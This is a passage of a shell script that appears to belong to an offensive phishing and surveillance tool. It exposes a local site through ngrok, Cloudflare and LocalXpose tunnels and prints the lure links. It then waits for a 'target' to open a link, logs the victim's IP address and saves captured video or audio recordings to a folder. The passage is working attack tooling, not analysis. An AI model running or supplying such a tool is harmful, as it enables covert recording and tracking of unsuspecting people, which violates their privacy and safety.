    termux-chroot ./loclx tunnel http --to ":${PORT}" &> loclx.log &
elif $brew; then
    ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
    cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
    localxpose tunnel http --to ":${PORT}" &> loclx.log &
else
    ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
    ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
    ./loclx tunnel http --to ":${PORT}" &> loclx.log &
fi
sleep 10
cd "$HOME/.site"
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z.]*.ngrok.io")
if ! [ -z "$ngroklink" ]; then
    ngrokcheck=true
else
    ngrokcheck=false
fi
for second in {1..10}; do
    if [ -f "$HOME/.tunneler/cf.log" ]; then
        cflink=$(grep -o "https://[-0-9a-z]*.trycloudflare.com" "$HOME/.tunneler/cf.log")
    fi
    if ! [ -z "$cflink" ]; then
        cfcheck=true
        break
    else
        cfcheck=false
    fi
    sleep 1
done
for second in {1..10}; do
    if [ -f "$HOME/.tunneler/loclx.log" ]; then
        loclxlink=$(grep -o "[-0-9a-z]*\.loclx.io" "$HOME/.tunneler/loclx.log")
    fi
    if ! [ -z "$loclxlink" ]; then
        loclxcheck=true
        loclxlink="https://${loclxlink}"
        break
    else
        loclxcheck=false
    fi
    sleep 1
done
if ( $ngrokcheck && $cfcheck && $loclxcheck ); then
    echo -e "${success}Ngrok, Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$ngroklink" 3 4
    url_manager "$loclxlink" 5 6
elif ( $ngrokcheck && $cfcheck &&  ! $loclxcheck ); then
    echo -e "${success}Ngrok and Cloudflared have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$ngroklink" 3 4
elif ( $ngrokcheck && $loclxcheck &&  ! $cfcheck ); then
    echo -e "${success}Ngrok and Loclx have started successfully!\n"
    url_manager "$ngroklink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $cfcheck && $loclxcheck &&  ! $loclxcheck ); then
    echo -e "${success}Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $ngrokcheck && ! $cfcheck &&  ! $loclxcheck ); then
    echo -e "${success}Ngrok has started successfully!\n"
    url_manager "$ngroklink" 1 2
elif ( $cfcheck &&  ! $ngrokcheck &&  ! $loclxcheck ); then
    echo -e "${success}Cloudflared has started successfully!\n"
    url_manager "$cflink" 1 2
elif ( $loclxcheck && ! $ngrokcheck &&  ! $cfcheck ); then
    echo -e "${success}Loclx has started successfully!\n"
    url_manager "$loclxlink" 1 2
elif ! ( $ngrokcheck && $cfcheck && $loclxcheck ) ; then
    echo -e "${error}Tunneling failed! Start your own port forwarding/tunneling service at port ${PORT}\n";
fi
sleep 1
rm -rf ip.txt log.txt
find . -name "*.webm" -type f -delete
find . -name "*.mp4" -type f -delete
find . -name "*.mkv" -type f -delete
find . -name "*.gif" -type f -delete
find . -name "*.wav" -type f -delete
find . -name "*.ogg" -type f -delete
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target has opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        echo ""
        cat ip.txt >> "$cwd/ip.txt"
        rm -rf ip.txt
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}Video/Audio has been downloaded! Check directory!\n"
        file=$(ls | grep webm || ls | grep mp4 || ls | grep mkv || ls | grep gif || ls | grep ogg || ls | grep wav)
        if ! [[ -z "$file" ]]; then
            onefile=$(echo $file | head -n1)
            mv -f "$onefile" "$FOL"
        fi
        rm -rf log.txt
    fi
    sleep 0.5
done


